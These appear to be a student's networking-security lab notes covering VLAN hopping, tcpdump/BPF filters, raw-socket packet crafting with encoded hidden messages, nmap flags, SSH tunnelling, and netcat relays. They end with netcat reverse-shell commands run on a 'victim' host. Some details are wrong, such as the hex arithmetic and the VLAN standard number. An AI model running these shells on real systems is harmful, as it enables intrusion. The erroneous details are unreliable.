# NETWORKING

## PROTOCOL DATA UNIT (PDU):
```
Session-Application = Data
Transport = Segment/Datagram
Network = Packet
Data Link = Frame
Physical = Bit
```
## INTERNET STANDARD ORGANIZATIONS 
```
IETF's-RFC's . (Internet Engineering Task Force). The ones responsible for writing and developing RFCs (guidelines)
IANA (Internet Assigned Numbers Authority)- Internet Numbers. IPV4,IPV6 address allocations, WK ports management, MAC OUI assigned to organizations (first 6 organizational identifiers, last 6 personal identifier)
IEEE (Institute of Electrical and Electronics Engineers). International, main standards are IEEE 802.11 (Wireless LAN), IEEE 802.3 (Ethernet), 802.10 (VLAN), IEEE 802.16 (Broadband Wireless Access, BWA), IEEE 802.1x (Port-based network access control standards,
used for authenticating and authirizing devices connecting to a LAN or WLAN, IEEE 802.1ad (Provider Bridging, PB, Standards) also known as Q-in-Q for implementing virtual LAN (VLAN) stacking in Ethernet networks).
```
## OSI layer and units -R
```
-Binary. Bit, Nibble (4 bits), Byte (8 bits), Half Word (16 bits), Word (32 bits)
-Decimal 
-Hex (0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F)
```
```
0XB7
8 4 2 1 8 4 2 1
1 0 1 1 0 1 1 1
0XB7 to Dec = B=11, (11x16)+(7x16) = 183
```
## Network topologies: Bus, RIng, Mesh, Wireless, Hierarchical.
## Network devices: Hub, Repeater, Switch, Router. 

## Speed	Bit-time
```
10 Mbps  100ns

100 Mbps  10ns

1 Gbps     1ns

10 Gbps   .1ns

100 Gbps .01ns
```
```
MAC. Medium Access Control. Controls transpond from layer 2 to layer 3.
LLC. Logical Link Control. Controls transpond from layer 3 to layer 2.
CAM table (Content-addressable memory) allows very fast searching and table lookups. 
```

## Switching Modes:
```
-Store-and-Forward accepts and analyzes the entire frame before forwarding it to its destination. It takes more time to examine the entire frame, but it allows the switch to catch certain frame errors and collisions and keep them from propagating bad frames through the network. This method is required to switch frames between links of different speeds; this is due to bit-timing. The speed at which the bits enter one interface may be slower than the speed at which the switch needs to send the bits to a different interface.

-Cut-Through (sometimes called fast forward) only examines the destination address before forwarding it to its destination segment. This is the fastest switching mode but requires the interfaces to be the same speed.

-Fragment-Free read at least 64 bytes of the Ethernet frame before switching it to avoid forwarding Ethernet runt frames (Ethernet frames smaller than 64 bytes). A frame should have a minimum of 46 bytes of payload plus its 18-byte frame header.
```
# CAM Table Overflow/Media Access Control (MAC) Attack - RESEARCH

```
MAC addresses 48-bit/6-Byte/12-Hex
```

## MAC Spoofing
```
Spoofing is the act of disguising a communication from an unknown source as being from a known or trusted source. Spoofing is an attack vector done at several different layers of the OSI. At the Data-link layer attackers will commonly spoof the MAC-address.

Originally MAC addresses were hard coded into the firmware of the NIC and could not be easily changed. This is why MAC addresses were commonly called "Firmware", "Hardware", or "Burned-in" addresses. In order to facilitate MAC spoofing attacks it required crafting of special frames with the MAC address pre-programmed in.

Today most MAC addresses are programmed using the software. This makes modification of a device’s MAC address much simpler. In order to perform a MAC spoofing attack the malicious actor can either change their MAC address to a known or trusted address or create crafted frames with the MAC address already programmed in. MAC spoofing can be used to perform:

ARP-Cache poisoning - modify the ARP cache of devices on the same network segment.

ARP Man-in-the-middle (MitM) attacks - Specially crafted ARP messages to force 2 or more victims to send traffic thru the attacker’s system. Here the attacker can sniff or alter traffic.
```
VLAN. Logically separates a network within the same hardware.


```
VLAN hopping Attack

VLAN hopping is an exploit method of attacking networked devices on separate virtual LAN (VLAN) without traversing a router or other Layer 3 device. The concept behind VLAN hopping attacks is for the attacker on one VLAN to gain access to traffic on other VLANs that would normally not be accessible. Keep in mind that VLAN hopping is typically a one-way attack. It will not be possible to get any response from the target device unless methods are setup on the target to respond with similar vlan hopping methods.

There are three primary methods of VLAN hopping:

Switch Spoofing

In this attack, an attacking host imitates a trunking switch by crafting Dynamic Trunking Protocol (DTP) frames in order to form a trunk link with the switch. With a trunk link formed the attacker can then use tagging and trunking protocols such as ISL or 802.1q. Traffic for all VLANs is then accessible to the attacking host.

switch(config)# interface fastethernet 1/10
switch(config-if)# switchport mode access
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport access vlan 10
switch(config)# iterface gigabit 0/1
switch(config-if)# switchport trunk encapsulation dot1q
switch(config-if)# switchport mode trunk
switch(config-if)# switchport nonegotiate
Tagging

This attack typically requires the attacker add the target 802.1Q tag manually to an Ethernet frame even though it is an access port. This process is normally done by the switch. The switch will receive the frame and forward it out the trunk port leading to the target without it needing to be routed. This method requires that the attacker and victim are separated by a trunk and success depends on the switch firmware being vulnerable.

Double Tagging

This attack works if the attacker knows what the "native VLAN" that is used on your organization. Typically VLAN 1 is used. All VLANs will be "tagged" with its corresponding VLAN. The Native VLAN however is intended for local network communication and is not tagged. Thus anything tagged for the native VLAN will be stripped off. The attacker will insert 2 tags into their frames. The first tag will be for the Native VLAN and the second tag will be for whatever VLAN he is trying to access. Upon receipt the switch will then remove the Native VLAN tag and will leave the second VLAN tag in tact. This method also requires that the attacker and victim be separated by a trunk and a vulnerable switch.

switch(config)# vlan dot1q tag native
switch(config)# interface fastethernet 1/10
switch(config-if)# switchport mode access
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport access vlan 10
switch(config)# iterface gigabit 0/1
switch(config-if)# switchport trunk encapsulation dot1q
switch(config-if)# switchport mode trunk
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport trunk native vlan 999


```
## VTP Trunking Protocol:

```
VLAN Trunking Protocol (VTP) is a Cisco proprietary protocol that propagates the definition of Virtual Local Area Networks (VLAN) on the whole local area network. VLAN Trunk Protocol (VTP) was developed to help reduce the administration of creating VLANs on all switches within a switched network. To do this, VTP sends VLAN information to all the switches in a VTP domain.

Server - can create, modify or delete VLANs. Can create and forward VTP messages.

Client - can only adopt VLAN information in VTP messages. Can forward VTP messages.

Transparent - only forwards VTP messages but does not adopt any of the information.

VTP advertisements are sent over all trunk links. VTP messages advertise the following on its trunk ports:

Management domain

Configuration revision number

Known VLANs and their specific parameters

There are three versions of VTP, version 1, version 2, version 3.

VTP is Cisco propietary 
```

## Dynamic Trunking Protocol (DTP):
```
The Dynamic Trunking Protocol (DTP) is a Cisco proprietary Layer 2 protocol. Its purpose is to dynamically negotiate trunking on a link between two switches running VLANS. It can also negotiate the type of trunking protocol to be used on the link (802.1q or ISL). DTP works by exchanging small DTP frames between two supporting devices to negotiate the link parameters.

Most switches will have DTP enabled by default in either "Dynamic-Auto" or "Dynamic-Desirable" modes.

```
## DTP Attack (Switch Spoofing):

```
DTP Attack (Switch Spoofing)
DTP attacks relate to the VLAN hopping attack discussed earlier. Attackers can craft their own DTP frames in order to negotiate a trunk link between their device and the switchport. This trunking connection would allow the attacker to communicate with all VLANs on the switch and to inject traffic into whatever VLAN they desire. Typically the trunk link will not be "pruned" or allowed VLANs specified so this connection will allow the attacker access to all VLANs on that switch. This attack is sometimes called "Switch Spoofing".

This attack can be mitigated by using the switchport nonegotiate interface command to disable DTP. Additionally you should manually assign switchports to either Access (switchport mode access) or Trunk (switchport mode trunk).

```
```
## Splunk, SO, Suricata, Elastic, Kibana, WS, CyberChef. -R 
```
Network traffic sniffers (Active-nmap, Passive)

# TCP Dump and filters 
```
sudo tcpdump -A #print payload in ASCII
sudo tcpdump -D #list all interfaces
sudo tcpdump -i #specify capture interface
sudo tcpdump -e #print data-link headers 
sudo tcpdump -X or XX #print payloac in HEX and ASCII
sudo tcpdump -r analysis-exam.pcap -XX -vv #Will give you everything, ensure you are in the right dir.
sudo tcpdump port 80 or 22 -vn
sudo tcpdump icmp
sudo tcpdump ip
```
## sockets and snippers -R
## byte offsets -R
```
https://www.wains.be/pub/networking/tcpdump_advanced_filters.txt
```
```
https://miro.com/app/board/o9J_klSqCSY=/?share_link_id=16133753693
```
```
https://packetlife.net/media/library/12/tcpdump.pdf
```
Can you use tcpdump to nail down a search on a big PCAP and output the search to create a reduced PCAP to open later on WS.
```
0x81000 VLAN header -R
0x8dd double packing -R
```

## BITWISE MASKING EX.
```
tcpdump 'ether[12:4] & 0xffff0fff = 0x81000abc #look at ether byte 12 and look at 4 bytes and exact matcher/0 Not important (QoS) -PCP/DEIR
tcpdump 'ip[1] & 252 = 32' -Q re-explain look for a DSCP of 32 
```
## Filter Logic- Most exclusive:
```
tcp[13] = 0x11 #all bits must match ACK/FIN mask - or 1
```
```
tcp[13] & 0x11 = 0x11 #ACK/FIN both have to be on. 
```
```
tcp[13] & 0x11 > 0 Can be any combination except both off
tcp[13] & 0x11 !=0 Can be any combination except both off
```
BPFS -R


# BPF Filters CTF
 tcpdump 'ip6[6] = 17 || ip[9] = 17' -r BPFCheck.pcap | wc -l #Looks for all ipv4 and ipv6 headers that are UDP.
 tcpdump -n ' ip[8] < 65 ||  ip6[7] < 65' -r BPFCheck.pcap | wc -l #Looks for all ipv4 and ipv6 headers that have a ttl of 64 or less.
 tcpdump 'tcp[0:2] >1024 || udp[0:2] > 1024' -r BPFCheck.pcap | wc -l #Looks for all packets that are TCP and have a port > than 1024.

What is the Berkeley Packet Filter, using tcpdump, to capture all packets with an IP ID field of 213?
tcpdump 'ip[4:2] = 213' -r BPFCheck.pcap | wc -l

What is the Berkeley Packet Filter, using tcpdump, to capture an attacker using vlan hopping to move from vlan 1 to vlan 10?
tcpdump -n 'ether[12:4] & 0xffff0fff = 0x81000001 && ether[16:4] & 0xffff0fff = 0x8100000A' -r BPFCheck.pcap | wc -l `

#TCP Stream CLient

```
import socket

# This can also be accomplished by using s = socket.socket() due to AF_INET and SOCK_STREAM being defaults
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ipaddr = '127.0.0.1' #When a computer needs to talk to itselft will use the loopback address NOT THE SYSTEM IP
port = 1111

s.connect((ipaddr, port))

# To send a string as a bytes-like object, add the prefix b to the string. \n is used to go to the next line (hit enter)
s.send(b'Message\n')

# It is recommended that the buffersize used with recvfrom is a power of 2 and not a very large number of bits
data, conn = s.recvfrom(1024)

# In order to receive a message that is sent as a bytes-like-object you must decode into utf-8 (default)
print(data.decode('utf-8'))

s.close()
```
#UDP Dgram CLient 
```
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ipaddr = '127.0.0.1'
port = 2222

# To send a string as a bytes-like object, add the prefix b to the string. \n is used to go to the next line (hit enter)
s.sendto(b'Message\n', (ipaddr,port))

# It is recommended that the buffersize used with recvfrom is a power of 2 and not a very large number of bits
response, conn = s.recvfrom(1024)

# In order to receive a message that is sent as a bytes-like-object you must decode into utf-8 (default)
print(response.decode())
```
#RAW IP-ID
```
#!/usr/bin/python3
# For building the socket
import socket
# For system level commands
import sys
# For establishing the packet structure (Used later on), this will allow direct access to the methods and functions in the struct module
from struct import pack
# For encoding
import base64    # base64 module
import binascii    # binascii module
# Create a raw socket.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit()
# 0 or IPPROTO_TCP for STREAM and 0 or IPPROTO_UDP for DGRAM. (man ip7). For SOCK_RAW you may specify a valid IANA IP protocol defined in RFC 1700 assigned numbers.
# IPPROTO_IP creates a socket that sends/receives raw data for IPv4-based protocols (TCP, UDP, etc). It will handle the IP headers for you, but you are responsible for processing/creating additional protocol data inside the IP payload.
# IPPROTO_RAW creates a socket that sends/receives raw data for any kind of protocol. It will not handle any headers for you, you are responsible for processing/creating all payload data, including IP and additional headers. (link)
packet = ''
src_ip = "127.0.0.1"
dst_ip = "127.0.0.1"

##################
##Build Packet Header##
##################
# Lets add the IPv4 header information
# This is normally 0x45 or 69 for Version and Internet Header Length
ip_ver_ihl =
# This combines the DSCP and ECN feilds.  Type of service/QoS
ip_tos =
# The kernel will fill in the actually length of the packet
ip_len = 0
# This sets the IP Identification for the packet. 1-65535
ip_id =
# This sets the RES/DF/MF flags and fragmentation offset
ip_frag =
# This determines the TTL of the packet when leaving the machine. 1-255
ip_ttl =
# This sets the IP protocol to 16 (CHAOS) (reference IANA) Any other protocol it will expect additional headers to be created.
ip_proto =
# The kernel will fill in the checksum for the packet
ip_check = 0
# inet_aton(string) will convert an IP address to a 32 bit binary number
ip_srcadd = socket.inet_aton(src_ip)
ip_dstadd = socket.inet_aton(dst_ip)

#################
## Pack the IP Header ##
#################
# This portion creates the header by packing the above variables into a structure. The ! in the string means 'Big-Endian' network order, while the code following specifies how to store the info. Endian explained. Refer to link for character meaning.
ip_header = pack('!BBHHHBBH4s4s' , ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

##########
##Message##
##########
# Your custom protocol fields or data. We are going to just insert data here. Add your message where the "?" is. Ensure you obfuscate it though...don't want any clear text messages being spotted! You can encode with various data encodings. Base64, binascii
message = b'last_name'                  #This should be the student's last name per the prompt
hidden_msg = binascii.hexlify(message)  #Students can choose which encodeing they want to use.
# final packet creation
packet = ip_header + hidden_msg
# Send the packet. Sendto is used when we do not already have a socket connection. Sendall or send if we do.
s.sendto(packet, (dst_ip, 0))
# socket.send is a low-level method and basically just the C/syscall method send(3) / send(2). It can send less bytes than you requested, but returns the number of bytes sent.
# socket.sendall is a high-level Python-only method that sends the entire buffer you pass or throws an exception. It does that by calling socket.send until everything has been sent or an error occurs.
```
```
student@blue-internet-host-student-2:~$ sudo tcpdump 'ip[4:2] = 1775' -XXvv
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
13:28:45.208521 IP (tos 0x0, ttl 64, id 1775, offset 0, flags [none], proto unknown (16), length 124)
    blue-internet-host-student-2 > 172.16.0.106:  chaos 104
	0x0000:  fa16 3eac 7a2a fa16 3e02 4778 0800 4500  ..>.z*..>.Gx..E.
	0x0010:  007c 06ef 0000 4010 bcd7 0a0a 0028 ac10  .|....@......(..
	0x0020:  006a 3435 3734 3635 3732 3665 3631 3663  .j457465726e616c
	0x0030:  3230 3637 3663 3666 3732 3739 3230 3639  20676c6f72792069
	0x0040:  3733 3230 3631 3633 3638 3639 3635 3736  7320616368696576
	0x0050:  3635 3634 3230 3734 3638 3732 3666 3735  6564207468726f75
	0x0060:  3637 3638 3230 3631 3633 3734 3639 3736  6768206163746976
	0x0070:  3635 3230 3636 3639 3637 3638 3734 3639  6520666967687469
	0x0080:  3665 3637 3265 3265 3265                 6e672e2e2e
^C
1 packet captured
1 packet received by filter
0 packets dropped by kernel

```
student@blue-internet-host-student-2:~$ sudo tcpdump 'ip[4:2] = 1775' -A
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
13:34:58.845067 IP blue-internet-host-student-2 > 172.16.0.106:  chaos 104
E..|....@...

.(...j457465726e616c20676c6f7279206973206163686965766564207468726f75676820616374697665206669676874696e672e2e2e
```
Copy all the ASCII information on cyberchef.io and bake it from HEX. Do not forget to sudo when running the script.


TCP Raw

```
#!/usr/bin/python3
#For building the socket
import socket
#For system level commands
import sys
#For doing an array in the TCP checksum
import array
#For establishing the packet structure (Used later on), this will allow direct access to the methods and functions in the struct module
from struct import pack
#For encoding
import base64    # base64 module
import binascii    # binascii module
# Create a raw socket.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit()
# 0 or IPPROTO_TCP for STREAM and 0 or IPPROTO_UDP for DGRAM. (man ip7). For SOCK_RAW you may specify a valid IANA IP protocol defined in RFC 1700 assigned numbers.
# IPPROTO_IP creates a socket that sends/receives raw data for IPv4-based protocols (TCP, UDP, etc). It will handle the IP headers for you, but you are responsible for processing/creating additional protocol data inside the IP payload.
# IPPROTO_RAW creates a socket that sends/receives raw data for any kind of protocol. It will not handle any headers for you, you are responsible for processing/creating all payload data, including IP and additional headers. (link)

src_ip = "127.0.0.1"
dst_ip = "127.0.0.1"

##################
##Build Packet Header##
##################
#Lets add the IPv4 header information
#This is normally 0x45 or 69 for Version and Internet Header Length
ip_ver_ihl =
#This combines the DSCP and ECN feilds.  Type of service/QoS
ip_tos =
#The kernel will fill in the actually length of the packet
ip_len = 0
#This sets the IP Identification for the packet. 1-65535
ip_id =
#This sets the RES/DF/MF flags and fragmentation offset
ip_frag =
#This determines the TTL of the packet when leaving the machine. 1-255
ip_ttl =
#This sets the IP protocol to 16 (CHAOS) (reference IANA) Any other protocol it will expect additional headers to be created.
ip_proto =
#The kernel will fill in the checksum for the packet
ip_check = 0
#inet_aton(string) will convert an IP address to a 32 bit binary number
ip_srcadd = socket.inet_aton(src_ip)
ip_dstadd = socket.inet_aton(dst_ip)

#################
##Pack the IP Header ##
#################
#This portion creates the header by packing the above variables into a structure. The ! in the string means 'Big-Endian' network order, while the code following specifies how to store the info. Endian explained. Refer to link for character meaning.

ip_header = pack('!BBHHHBBH4s4s' , ip_ver_ihl, ip_tos, ip_len, ip_id, ip_frag, ip_ttl, ip_proto, ip_check, ip_srcadd, ip_dstadd)

################
##Build TCP Header##
################
#source port. 1-65535
tcp_src =
#destination port. 1-65535
tcp_dst =
#sequence number. 1-4294967296
tcp_seq =
#tcp ack sequence number. 1-4294967296
tcp_ack_seq =
#can optionaly set the value of the offset and reserve. Offset is from 5 to 15. RES is normally 0.
#tcp_off_res =
#data offset specifying the size of tcp header * 4 which is 20
tcp_data_off =
#the 3 reserve bits + ns flag in reserve field
tcp_reserve =
#Combine the left shifted 4 bit tcp offset and the reserve field
tcp_off_res = (tcp_data_off << 4) + tcp_reserve
#can optionally just set the value of the TCP flags
#tcp_flags =
#Tcp flags by bit starting from right to left
tcp_fin = 0                    # Finished
tcp_syn = 0                    # Synchronization
tcp_rst = 0                    # Reset
tcp_psh = 0                    # Push
tcp_ack = 0                    # Acknowledgement
tcp_urg = 0                    # Urgent
tcp_ece = 0                    # Explicit Congestion Notification Echo
tcp_cwr = 0                    # Congestion Window Reduced
#Combine the tcp flags by left shifting the bit locations and adding the bits together
tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5) + (tcp_ece << 6) + (tcp_cwr << 7)
# maximum allowed window size reordered to network order. 1-65535 (socket.htons is deprecated)
tcp_win =
# tcp checksum which will be calculated later on
tcp_chk =
# urgent pointer only if urg flag is set
tcp_urg_ptr =

# The ! in the pack format string means network order
tcp_hdr = pack('!HHLLBBHHH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win, tcp_chk, tcp_urg_ptr)

##########
##Message##
##########

# Your custom protocol fields or data. We are going to just insert data here.
# Ensure you obfuscate it though...don't want any clear text messages being spotted!
# You can encode various data encodings. Base64, binascii

message = b'last_name'                                    # This should be the student's last name per the prompt
hidden_msg = base64.b64encode(message)                    # base64.b64encode will encode the message to Base 64

######################
##Create the Pseudo Header##
######################

# After you create the tcp header, create the pseudo header for the tcp checksum.

src_address = socket.inet_aton(src_ip)
dst_address = socket.inet_aton(dst_ip)
reserved = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_hdr) + len(hidden_msg)

#####################
##Pack the Pseudo Header##
#####################

ps_hdr = pack('!4s4sBBH', src_address, dst_address, reserved, protocol, tcp_length)
ps_hdr = ps_hdr + tcp_hdr + hidden_msg

#########################
##Define the Checksum Function##
#########################

def checksum(data):
        if len(data) % 2 != 0:
                data += b'\0'
        res = sum(array.array("H", data))
        res = (res >> 16) + (res & 0xffff)
        res += res >> 16
        return (~res) & 0xffff

tcp_chk = checksum(ps_hdr)

##############
##Final TCP Pack##
##############

# Pack the tcp header to fill in the correct checksum - remember checksum is NOT in network byte order
tcp_hdr = pack('!HHLLBBH', tcp_src, tcp_dst, tcp_seq, tcp_ack_seq, tcp_off_res, tcp_flags, tcp_win) + pack('H', tcp_chk) + pack('!H', tcp_urg_ptr)

# Combine all of the headers and the user data
packet = ip_header + tcp_hdr + hidden_msg

# s.connect((dst_ip, port)) # typically used for TCP
# s.send(packet)

# Send the packet. Sendto is used when we do not already have a socket connection. Sendall or send if we do.
s.sendto(packet, (dst_ip, 0))

# socket.send is a low-level method and basically just the C/syscall method send(3) / send(2). It can send fewer bytes than you requested, but returns the number of bytes sent.
#socket.sendall ﻿is a high-level Python-only method that sends the entire buffer you pass or throws an exception. It does that by calling socket.send ﻿ until everything has been sent or an error occurs.



student@blue-internet-host-student-2:~$ sudo tcpdump 'tcp[0:2] = 6969' -XXvv
[sudo] password for student: 
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
13:57:24.809300 IP (tos 0x0, ttl 255, id 1801, offset 0, flags [none], proto TCP (6), length 84)
    localhost.6969 > 10.10.10.10.42020: Flags [S], cksum 0x9ec9 (correct), seq 1:45, win 65535, length 44
	0x0000:  fa16 3eac 7a2a fa16 3e02 4778 0800 4500  ..>.z*..>.Gx..E.
	0x0010:  0054 0709 0000 ff06 2186 7f00 0001 0a0a  .T......!.......
	0x0020:  0a0a 1b39 a424 0000 0001 0000 0000 5002  ...9.$........P.
	0x0030:  ffff 9ec9 0000 5357 3530 5a57 7873 6157  ......SW50ZWxsaW
	0x0040:  646c 626d 4e6c 4948 526f 636d 3931 5a32  dlbmNlIHRocm91Z2
	0x0050:  6767 6347 5679 6332 6c7a 6447 5675 5932  ggcGVyc2lzdGVuY2
	0x0060:  553d                                     U=
^C
1 packet captured
1 packet received by filter
0 packets dropped by kernel
student@blue-internet-host-student-2:~$ sudo tcpdump 'tcp[0:2] = 6969' -A
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
13:57:41.902375 IP localhost.6969 > 10.10.10.10.42020: Flags [S], seq 1:45, win 65535, length 44
E..T.	....!.....



.9.$........P.......SW50ZWxsaWdlbmNlIHRocm91Z2ggcGVyc2lzdGVuY2U=

## Encode text to Hex:
```
echo "Message" | xxd
```
## Encode file to Hex:
```
xxd file.txt file-encoded.txt
```
## Decode file from Hex:
```
xxd -r file-encoded.txt file-decoded.txt
```
## Encode text to base64:
```
echo "Message" | base64
```
## Endode file to Base64:
```
base64 file.txt > file-encoded.txt
```
## Decode file from Base64:
```
base64 -d file-encoded.txt > file-decoded.txt
```

-sS	nmap 192.168.1.1 -sS	        TCP SYN port scan (Default)
-sT	nmap 192.168.1.1 -sT	        TCP connect port scan (Default without root privilege)
-sU	nmap 192.168.1.1 -sU	        UDP port scan
-sA	nmap 192.168.1.1 -sA	        TCP ACK port scan
-sW	nmap 192.168.1.1 -sW            TCP Window port scan
-sM	nmap 192.168.1.1 -sM	        TCP Maimon port scan
-sL	nmap 192.168.1.1-3 -sL	        No Scan. List targets only
-sn	nmap 192.168.1.1/24 -sn         Disable port scanning. Host discovery only.
-Pn	nmap 192.168.1.1-5 -Pn		Disable host discovery. Port scan only.
-PS	nmap 192.168.1.1-5 -PS22-25,80	TCP SYN discovery on port x. Port 80 by default
-PA	nmap 192.168.1.1-5 -PA22-25,80	TCP ACK discovery on port x. Port 80 by default
-PU	nmap 192.168.1.1-5 -PU53	UDP discovery on port x. Port 40125 by default
-PR	nmap 192.168.1.1-1/24 -PR	ARP discovery on local network
-n	nmap 192.168.1.1 -n		Never do DNS resolution
-p	nmap 192.168.1.1 -p 	21			Port scan for port x
-p	nmap 192.168.1.1 -p 	21-100			Port range
-p	nmap 192.168.1.1 -p 	U:53,T:21-25,80		Port scan multiple TCP and UDP ports
-p	nmap 192.168.1.1 -p-	Port scan all ports
-p	nmap 192.168.1.1 -p 	http,https		Port scan from service name
-F	nmap 192.168.1.1 -F	Fast port scan (100 ports)
-top-ports	nmap 192.168.1.1 -top-ports 2000	Port scan the top x ports
-p-65535	nmap 192.168.1.1 -p-65535	Leaving off initial port in range makes the scan start at port 1
-p0-	nmap 192.168.1.1 -p0-	Leaving off end port in range
makes the scan go through to port 65535




ssh net1_student2@10.50.21.8 -X

passw: password2

-nmap 
-netcat (does not use -p for ports)





wget -r  http://172.16.82.106 (DNS server enum)
wget -r  ftp://172.16.82.106
show ip route (VyOS) 



Download a file from a remote directory to a local directory
```
$ scp student@172.16.82.106:secretstuff.txt /home/student
```
Upload a file to a remote directory from a local directory
```
$ scp secretstuff.txt student@172.16.82.106:/home/student
```
Copy a file from a remote host to a separate remote host
```
$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
```
password:    password:

Recursive upload of a folder to remote
```
$ scp -r folder/ student@172.16.82.106:
```
Recursive download of a folder from remote
```
$ scp -r student@172.16.82.106:folder/ .
```
Download a file from a remote directory to a local directory
```
$ scp -P 1111 student@172.16.82.106:secretstuff.txt .
```
Upload a file to a remote directory from a local directory
```
$ scp -P 1111 secretstuff.txt student@172.16.82.106:
```
# Loopback address + tunnel's port. Are the 2 items that we need to interact with our tunnels.

Create a Dynamic Port Forward to target device
```
$ ssh student@172.16.82.106 -D 9050 -NT
```
Download a file from a remote directory to a local directory
```
$ proxychains scp student@localhost:secretstuff.txt .
```
Upload a file to a remote directory from a local directory
```
$ proxychains scp secretstuff.txt student@localhost:
```

## NETCAT: CLIENT TO LISTENER FILE TRANSFER

### Listener (receive file):
```
nc -lvp 9001 > newfile.txt
```
### Client (sends file):
```
nc 172.16.82.106 9001 < file.txt
```

# NETCAT RELAY DEMOS
## Listener - Listener

### On Blue_Host-1 Relay:
```
$ mknod mypipe p

$ nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
```


### On Internet_Host (send):
```
$ nc 172.16.82.106 1111 < secret.txt
```
### On Blue_Priv_Host-1 (receive):
```
$ nc 192.168.1.1 3333 > newsecret.txt
```
```
When T2 is pushing jpg (Client)
Relay will do:
nc -lvp 1111 < mypipe | nc -lvp 1234 > mypipe
T1 (Internet host) will do:
nc 172.16.40.10 1111 > 2steg.jpg
```
```
When T2 is Listening (Server)
Relay will do:
nc -lvp 1111 < mypipe | nc 172.16.82.115 6789 > mypipe
T1 will do:
nc 172.16.40.10 1111 > 3steg.jpg
```








# REVERSE SHELL USING NETCAT
## First listen for the shell on your device.
```
$ nc -lvp 9999
```
On Victim using -c :
```
$ nc -c /bin/bash 10.10.0.40 9999
```
On Victim using -e :
```
$ nc -e /bin/bash 10.10.0.40 9999
```



